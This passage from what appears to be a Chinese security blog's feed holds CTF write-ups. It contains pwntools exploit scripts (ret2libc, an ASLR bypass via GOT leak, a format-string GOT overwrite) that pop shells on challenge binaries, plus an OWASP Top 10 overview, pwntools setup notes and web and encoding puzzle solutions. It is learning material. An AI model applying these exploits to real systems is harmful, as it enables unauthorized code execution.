python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10002)</span></span><br><span class="line">sys_addr=<span class="number">0xf7e138b0</span></span><br><span class="line">binsh_addr=<span class="number">0xf7f5e42d</span></span><br><span class="line">payload =  <span class="string">&#x27;A&#x27;</span>*<span class="number">140</span> + p32(sys_addr) + <span class="string">&#x27;A&#x27;</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/19.jpg" alt="6.jpg"></p><h4 id="0x02-ret2libc-绕过ASLR-PIE"><a href="#0x02-ret2libc-绕过ASLR-PIE" class="headerlink" title="0x02 ret2libc(绕过ASLR/PIE)"></a>0x02 ret2libc(绕过ASLR/PIE)</h4><p>文件：还是level2<br>保护：ASLR NX<br>下面我们把系统ASLR/PIE防护开启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 2 &gt;  /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/20.jpg" alt="figure"><br>这里就不能像上题那样将返回地址覆盖成libc库函数的地址了，因为每次执行libc的地址会有一定的偏移，但我们仍然能定位到libc库函数的地址。具体怎么做呢？<br>level2内的vulnerable_function()内调用read函数时，执行了call &lt;read@plt&gt;指令，plt是什么呢？<a href="https://www.freebuf.com/articles/system/135685.html">这里</a>有详细的解释。文章内我只简单解释。。<br>我们先读取level2文件的elf结构：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/21.jpg" alt="figure"><br>发现.plt段在level2文件内，和程序段.text是分开的。<br>这里就不放图了，不知道为什么我step进call &lt;write@plt&gt;的时候直接跳到了write汇编程序地址，立个flag, 有空补上。<br>简单的说，plt是个跳转表 跳转到got表中read函数地址指针所在的区域，然后在got表内再跳转，最终才会跳转到write函数的地址。这种链接采用的是延迟绑定技术，执行第一个libc库函数时，libc才会链接到到level2，由于我们在vulnerable_function()中执行了read(),write()地址也就固定了。（整个过程我也不是很清楚，如果你想深入了解还得多看看其他资料）。</p><p>下面说说绕过ASLR/PIE的思路：<br>上文提到：调用libc库函数采用延迟绑定技术，执行第一个libc库函数时，libc才会链接到到level2，由于我们在vulnerable_function()中执行了read(),write()地址也就固定了。因此第一步是先获取到write函数真正的地址，记为write_addr。由于write()和system()在libc中的相对位置是固定的，也就是说它们之间的偏移量固定，因此我们就可以先事先获取偏移量，然后借助read函数作为跳板，就能得到system()的地址sys_addr了。同样的”/bin/sh”的地址也能固定，binsh_addr也出来了。<br>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;, 10003)</span></span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;plt_write= &#x27;</span> + <span class="built_in">hex</span>(plt_write)</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;got_write= &#x27;</span> + <span class="built_in">hex</span>(got_write)</span><br><span class="line">vulfun_addr = <span class="number">0x08048404</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;vulfun= &#x27;</span> + <span class="built_in">hex</span>(vulfun_addr)</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">0x1</span>) +p32(got_write) + p32(<span class="number">0x4</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n###sending payload1 ...###&quot;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n###receving write() addr...###&quot;</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;write_addr=&#x27;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;</span></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr= &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr= &#x27;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n###sending payload2 ...###&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/22.jpg" alt="figure"></p><h4 id="0x03格式化字符串漏洞"><a href="#0x03格式化字符串漏洞" class="headerlink" title="0x03格式化字符串漏洞"></a>0x03格式化字符串漏洞</h4><p>文件：pwne (2017湖湘杯pwn200赛题)<br>保护：ASLR NX<br>printf函数的格式化字符串常见的有 %d，%f，%c，%s（用于读取内存数据），%x（输出16进制数，前面没有0x），%p或%#x（输出16进制数，前面带有0x）；%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，用于修改内存，除了%n,还有%hn，%hhn，%lln，分别为写入目标空间4字节，2字节，1字节，8字节。</p><p>综上，格式化字符可以分为两类：读取数据格式符和写入数据格式符。</p><p>这里说一下，不是所有C编译器都支持%n, 我在windows上的codeblocks配的是C99标准的gcc编译器，执行无法靠%n写入数据，在这里我也有点迷惑，出题的人到底是用的什么编译器。。</p><p>既然本地不一定能做到，那就用现成的题目文件吧。</p><p>下面我们用这个文件看一下利用格式化字符串漏洞读取数据的方法：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/23.jpg" alt="figure"><br>我们看到，第七个%x取值是0x41414141, 也就是AAAA的ascii码，造成内存泄漏了。<br>解释：该文件GET YOUR NAME:后， 执行的是printf(str)。<br>也就是说，它把我们的输入当格式化字符串执行了。<br>我们%x取的其实是寄存器中的内容，寄存器里面又存什么呢？<br>是printf除格式化字符串外的参数，但是这里没有输入参数，也就是说，寄存器的内容其实是垃圾值。</p><p>那又为什么在第七个%x取值位置输出了AAAA呢？<br>因为调用printf后，首先再把格式化字符串压栈，再把参数地址存进寄存器和栈中，再把所有能用的寄存器压栈，最后存进了个格式化字符串指针（用来指向格式化字符串地址，检索格式符），我这个ubuntu linux内寄存器地址加空白地址一共六个四字节空间，第七个取到的就是格式化字符串中的AAAA了。<br>栈图(网上找的)如下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/23.png" alt="figure"><br>墨绿是寄存器地址，蓝色是空白位或者额外的存储参数空间，绿色是格式化字符串内容，橙色是格式化字符串指针。</p><p>夸张的是，%x能泄露栈上高地址位的内容，%n的修改内存的功能，能将更改任意函数的调用。这两者结合简直无法无天。</p><p>下面进入题目分析环节。。。：<br>IDA pro分析：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/24.jpg" alt="figure"><br>这道题了里，我们先利用%$7x(取第7个四字节数)， 返回puts函数链接后的地址。然后用%n改变atoi的调用，使它的调用地址指向system的函数地址（用偏移量算）,输入的age没经过类型检查，直接换成”/bin/sh”, 大功告成。<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwne&#x27;</span>)</span><br><span class="line"><span class="comment"># conn=remote(&#x27;ip&#x27;,port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwne&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[Y/N]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;NAME:\n\n&#x27;</span>)</span><br><span class="line">p.sendline(p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + <span class="string">&#x27;%7$s&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;WELCOME \n&#x27;</span>)</span><br><span class="line">puts_addr=p.recv()[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line"><span class="comment"># print u32(put_addr)</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u32(puts_addr)</span><br><span class="line">atoi_got_addr = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">p.sendline(<span class="string">&#x27;17&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[Y/N]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;NAME:\n\n&#x27;</span>)</span><br><span class="line">p.sendline(fmtstr_payload(<span class="number">7</span>, &#123;atoi_got_addr: system_addr&#125;))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;GET YOUR AGE:\n\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/25.jpg" alt="figure"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP Top 10  介绍和理解</title>
      <link href="2020/03/05/OWASP-Top-10-%E4%BB%8B%E7%BB%8D%E5%92%8C%E7%90%86%E8%A7%A3/"/>
      <url>2020/03/05/OWASP-Top-10-%E4%BB%8B%E7%BB%8D%E5%92%8C%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>大三下刚开学，打算网安实习，看到一些职位要求了解OWASP Top 10，打算在这里记录了解到的知识以及凭记忆和搜索引擎分析分析这些安全威胁产生的具体场景。</p><span id="more"></span><h4 id="OWASP-Top10是什么"><a href="#OWASP-Top10是什么" class="headerlink" title="OWASP Top10是什么?"></a>OWASP Top10是什么?</h4><p>先看下<a href="http://www.owasp.org.cn/">OWASP中国官网</a>的自我介绍。</p><blockquote><p>OWASP(Open Web Application Security Project)是一个开源的、非盈利的全球性安全组织，致力于应用软件的安全研究。我们的使命是使应用软件更加安全，使企业和组织能够对应用安全风险做出更清晰的决策。目前OWASP全球拥有250个分部近7万名会员，共同推动了安全标准、安全测试工具、安全指导手册等应用安全技术的发展。</p></blockquote><p>简明地说，OWASP为全球应用软件开发商提供安全标准，安全工具，安全指导手册，引导互联网从业的开发者开发更安全的应用软件。</p><p>而OWASP Top 10 指的是“10项最严重的Web 应用程序安全风险列表”，它总结了Web应用程序最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。</p><blockquote><p>当前版本: <a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf">OWASP Top 10 2017</a></p></blockquote><h4 id="OWASP-Top10有哪些内容？"><a href="#OWASP-Top10有哪些内容？" class="headerlink" title="OWASP Top10有哪些内容？"></a>OWASP Top10有哪些内容？</h4><p><strong>Top 1- 注入</strong></p><blockquote><p>将不安全的命令作为命令发送给解析器，会产生类似于SQL注入、NoSQL注入、OS注入和LDAP注入(轻量目录访问协议) 的缺陷，攻击者可以构造恶意数据通过注入缺陷的解析器执行没有权限的非预期命令或访问数据。</p></blockquote><p>一般来说，存在后台的web页面会将用户提交的查询，注册，登录信息通过post或get请求发送给后台，后台接收到这些参数就会处理，部分参数需要构造sql查询语句提交给数据库查询，获得结果后后台就回回显到前端web页面中。在这个过程中如果后端在收到参数后不进行特殊语句检查，将构造好的sql语句直接传给数据库执行，用户就能通过传参构造一些恒成立条件来控制查询，得到自己想要的数据，甚至管理员权限。</p><p>分享一个我觉得不错的sql注入练习平台<a href="https://redtiger.labs.overthewire.org/">RedTiger’s Hackit</a>。</p><p><strong>Top 2-失效的身份认证和会话管理</strong></p><blockquote><p>通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者暂时或永久的冒充其他用户的身份。</p></blockquote><p>通常指身份认证信息外泄。<br>场景：黑客攻破了你家地操作系统并远程操纵获取了浏览器文件夹下cookie和目的ip信息，这样一来，黑客就能直接伪造身份提交请求，登录你的账号，所以保护好自己Cookie很重要。</p><p><strong>Top 3-敏感数据泄露</strong></p><blockquote><p>一般我们的敏感信息包括密码、财务数据、医疗数据等，由于web应用或者API未加密或不正确的保护敏感数据，这些数据极易遭到攻击者利用，攻击者可能使用这些数据来进行一些犯罪行为，因此，未加密的信息极易遭到破坏和利用，我们应该加强对敏感数据的保护，web应用应该在传输过程中数据、存储的数据以及和浏览器的交互时的数据进行加密，保证数据安全。</p></blockquote><p>1：这里最后一句是关键：<code>web应用应该在传输过程中数据、存储的数据以及和浏览器的交互时的数据进行加密，保证数据安全</code>。敏感数据泄露往往是因为第二层保护没做好。当计算机遭受黑客入侵时，第一层系统保护已经被攻破了，而你本机或服务器的数据是存储在数据库中的，如果将密码等珍贵数据以明文存储，黑客就能直接获取走人，但如果你又给这些数据加密，被盗的也是密文，至于能不能被破解也要看你选择的加密体系，现代密码学（sha1,md5等）提供的加密方案就能很好地保护密文不被破译，当然凯撒和维吉尼亚密码这些古典密码体系加密方案就难说了。。<br>2：无https保护，账号密码全部在http包内明文发送，要是有人监听局域网（抓包），妥妥泄露隐私。</p><p><strong>Top 4-外部实体(XXE)</strong></p><blockquote><p>XXE 全称为XML External Entity attack 即XML(可扩展标记语言) 外部实体注入攻击，早期或配置错误的XML处理器评估了XML文件外部实体引用，攻击者可以利用这个漏洞窃取URI(统一资源标识符)文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p></blockquote><p>XML和html类似，但是XML文件能引用的文件不限于js, css, 他能做到任意文件和数据结构的数据访问，这一点像后端模板引擎，能引用后端发送出的所有数据结构内的数据。</p><p><strong>Top 5失效的访问控制</strong></p><blockquote><p>未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p></blockquote><p>引用已经讲得很清楚了。</p><p><strong>Top 6安全配置错误</strong></p><blockquote><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p></blockquote><p>场景：框架，库内的注释记了管理员密码，上传到公共云平台。</p><p><strong>Top 7跨站脚本</strong></p><blockquote><p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建HTML或JavaScript 的浏览器API 更新现有的网页时，就会出现XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p></blockquote><p><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">XSS wiki</a></p><p><strong>Top 8不安全的反序列化</strong></p><blockquote><p>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p></blockquote><p>–什么是反序列化？<br>有些时候我们需要把应用程序中的数据以另一种形式进行表达，以便于将数据存储起来，并在未来某个时间点再次使用，或者便于通过网络传输给接收方。这一过程我们把它叫做序列化。典型的例子是，用户数据被序列化后存储到数据库中，用户登陆后的身份数据被序列化存储到了浏览器中。</p><p>–反序列化有什么安全问题？<br>尽管反序列化最严重可导致远程代码执行（RCE，Remote Code Execution），但最常见的反序列化安全问题却是通过修改序列化之后的数据字段，从而进行提权或越权操作。</p><p>举例来说，服务器端为了能快速横向扩展而被设计成了后端无服务状态架构，这也就意味着用户登陆后，其身份信息（例如用户ID，姓名，角色，登陆时间戳等）被保存到了浏览器cookie当中，在后续的请求里将会被自动发往服务器。</p><p>存储于cookie中的这份数据的格式是应用程序自定义的，但攻击者通过探索尝试后发现，修改其中的某个字段就能将用户从普通用户修改为管理员。</p><p>存储于cookie中的原始数据：<br><code>Cookie: 3844998|AliceM|y|27|*NU*|active|null|201809</code></p><p>经过修改后的数据：<br><code>Cookie: 3844998|AliceM|y|27|*ADMIN*|active|null|201809</code><br>由于缺乏对数据完整性的校验，服务器端在收到被修改过的这段数据后，就把当前用户当作ADMIN用户来处理了。<br>当然，现在的服务器都会对cookie进行加密，攻击者修改成想要的序列化数据有一定难度。</p><p><strong>Top 9使用含有已知漏洞的组件</strong><br>组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p><p><strong>Top 10不足的日志记录和监控</strong><br>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p><p>引用资料：<br><a href="https://blog.csdn.net/wang_624/article/details/89683571">OWASP Top 10 简单介绍</a><br><a href="https://zhuanlan.zhihu.com/p/46505934">知乎专栏-什么是 owasp 10?</a><br><a href="https://www.jianshu.com/p/fa912ce0426f">简书-不安的反序列化</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> owasp </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools下踩的坑</title>
      <link href="2020/02/25/pwntools%E4%B8%8B%E8%B8%A9%E7%9A%84%E5%9D%91/"/>
      <url>2020/02/25/pwntools%E4%B8%8B%E8%B8%A9%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>纯pwn小白在疫情期间无聊，于是开始玩起了pwn。期间在i春秋,freebuf，知乎上随便看了几篇入门手册，难受的是技术活什么都看不懂。。距离上次接触汇编是大一下学期吧，当时计算机系统的实践课程要求做某常青藤的bomblab,当时跟着大佬的步骤勉强完成三关。探索的过程很累，尤其是在汇编知识还没消化完，就去做ret2somefunc的题，一个字：难，两个字：难顶。</p><span id="more"></span><p>废话不多说，下面记录配pwntools环境踩的坑。当然踩坑还是因为没有先好好读官方文档。</p><p><strong>0x00 介绍</strong><br>pwntools(v2.0)是编写漏洞利用脚本的python库，设计者将它分为两个模块：pwnlib与pwn。 pwnlib是个干净的模块，适合初学者快速入门。而pwn是打CTF专用的工具箱，是pwnlib的超集，功能更多，也更难入门。具体介绍请看<a href="http://docs.pwntools.com/en/stable/about.html">pwntools文档</a>。</p><p><strong>0x01</strong><br><strong>pwntools不适配windows中的python</strong>。<br>我先尝试在windows环境下pip install pwn。很快就装好了，本以为直接运行python脚本就大功告成了，结果编译器告诉我：</p><p><img src="/2020/02/25/pwntools%E4%B8%8B%E8%B8%A9%E7%9A%84%E5%9D%91/1.JPG" alt="figure1"><br>行吧，缺东西，咱用pip补上，但是发现_curses仅支持linux，巧的是在win平台上有对应轮子。然后还是会有问题，就开始无限打补丁。。当然最后脑子没抽到底，换到了<strong>linux</strong>内,这里推荐ubuntu linux 64。</p><p><strong>0x02</strong><br><strong>要想方便流畅写exp，最好装在python2内</strong>。<br>为什么？因为从python3开始，str和bytes的边界不再模糊。python2中 str+bytes能合并成bytes，默认将str以ascii编码解码，而python3中，除非加法重定向，否则无法合并成统一格式。所以在python3中要想合并str和bytes。只能<code>str.encode(&#39;ascii&#39;)+bytes</code>或者<code>str.encode+bytes.decode(&#39;ascii&#39;)</code></p><p><strong>0x03</strong><br><strong>pwntools不适合装在32位系统中</strong><br> 该坑是我在ubuntu 32安装pwntools遇到的，执行exp会有警告，pwntools仍然会起作用，但是具体会产生什么影响我也不清楚，因为当时还在写最简单的exp, 栈溢出攻击，ret2shellcode攻击。</p><p> 另外，pwntools真的是非常好的工具，接口很齐全，谁用谁知道。</p><p> 完。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爆破 1</title>
      <link href="2020/02/23/%E7%88%86%E7%A0%B4/"/>
      <url>2020/02/23/%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<p>CTF</p><span id="more"></span><p><img src="/2020/02/23/%E7%88%86%E7%A0%B4/t.JPG" alt="爆破1-3"><br>实践证明，提示也有不可靠的时候，出题人也会鸡贼。<br><a href="https://www.ichunqiu.com/battalion">爆破一题目地址</a><br>这道题有时间限制，必须在一小时内完成，否则页面会失效，说白了是为了杜绝签到题互相抄袭hhh。<br>进去后给的是php后端源码。</p><p>这是本菜鸡第一次接触<del>拍黄片</del> php, 会了几招后发现php的语法简直像是C+python的私生子，带基因缺陷的那种。它很多函数方法都能轻易地获得文件地所有信息，还有大堆地全局变量魔术变量，配上eval()方法地缺陷，简直是爆破对象的上上之选啊。。<br>废话不多说，来看看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\w*$/&#x27;</span>,<span class="variable">$a</span> ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;ERROR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>@$_REQUEST[‘hello’] 提示我们上传的变量名为hello</p><p>request是两种数据上传方式post和get的统称<br>这里当然选更方便的get, 直接在url后加hello变量<br>下面的判断语句中的正则提示我们变量必须为[A-Za-z0-9_]<br>以及$$a告诉咱$a的值不能乱输，值要符合变量命名规则：开头字母下划线，之后只能字母下划线或数字。<br>继续往下看, 就发现神圣的选择开始了：</p><p>1：利用var_dump()输出变量内容，前提是得知道有个变量名是输入的值。其实不可能给你猜的，这种情况下只能全局变量或魔术变量。保险起见，选个超集：$GLOABALS</p><p>2: 类似sql注入，绕开var_dump()直接执行命令，这要求咱输入的命令包括“flag.php”，但是正则不允许吖，该思路失败。<br>最后按照1思路，直接把include”flag.php”后的全局变量全打印出来了。<br>发现flag在一个六位的全局变量里。</p><p>做到这里再看提示，说真的，应该只有高手和做完的人能推出其中意思，我这样的菜鸡很有可能去猜文件里的六位变量值。</p><p>后面陆续把爆破二，爆破三做掉了（偷偷参考了下WP 嘿嘿）</p><p>总结的话就是：web题解决的关键的熟悉php以及理解php的脆弱方面；2 php是直接上最好的语言（狗头）</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>传感器1</title>
      <link href="2020/02/13/%E4%BC%A0%E6%84%9F%E5%99%A81/"/>
      <url>2020/02/13/%E4%BC%A0%E6%84%9F%E5%99%A81/</url>
      
        <content type="html"><![CDATA[<p>本着入门的想法，在writeup的帮助下，试做人生中第一道CTF赛题, 本文目的是还原脱离wp的写题思路。</p><span id="more"></span><p><img src="/2020/02/13/%E4%BC%A0%E6%84%9F%E5%99%A81/1.jpg" alt="传感器1"><br>题目出自 <a href="https://www.ichunqiu.com/battalion?t=1&r=58837">i春秋CTF大本营: 2017届全国大学生信息安全竞赛</a></p><p>已知 A传感器的ID和它的输出， 以及B的输出。<br>求另一个传感器B的ID。</p><p>大致思路是从输出中寻找输出和ID的联系，而A的ID和输出就是线索。</p><p>发现输出是16进制，遇到进制问题首先做的肯定是比对进制转换后的数字。</p><p>先用在线工具转换一下A的输出<br><img src="/2020/02/13/%E4%BC%A0%E6%84%9F%E5%99%A81/2.jpg" alt="传感器1"></p><p>发现最有规律的是2进制和8进制数据<br>但是考虑到8进制不常用，并且它的规律集中在52上，没法利用<br>所以接下来看2进制：<br>2进制数据除了前5个1，后面的数据都以二进制对01，10的形式在做排列组合<br>我们需要的是有规律的数，<br>所以可以舍弃掉输出中的前两位(3E , 5个1包含在其中)<br>继续观察余下的二进制数<br>发现很像数字逻辑中的电平跳变，0代表低位，1代表高位<br>该二进制数据可能是在传输数据。但是没有连续的0和1，因此该数据很有可能经过编码<br>查找各编码形式后发现只有曼切斯特编码和差分曼切斯特编码符合这个规律</p><h6 id="曼切斯特编码："><a href="#曼切斯特编码：" class="headerlink" title="曼切斯特编码："></a>曼切斯特编码：</h6><p>data用跳变表示，0和1对应01和10<br>至于谁对应谁有两种标准：<br><img src="/2020/02/13/%E4%BC%A0%E6%84%9F%E5%99%A81/3.png" alt="传感器1"></p><h6 id="差分曼切斯特编码："><a href="#差分曼切斯特编码：" class="headerlink" title="差分曼切斯特编码："></a>差分曼切斯特编码：</h6><p>数字信号对应电平跳变，存在初始电平跳变cc=01, 当前的信号为0意味着当前跳变和上一个跳变相同，为1意味着当前跳变和前一个跳变不同。<br><img src="/2020/02/13/%E4%BC%A0%E6%84%9F%E5%99%A81/4.jpg" 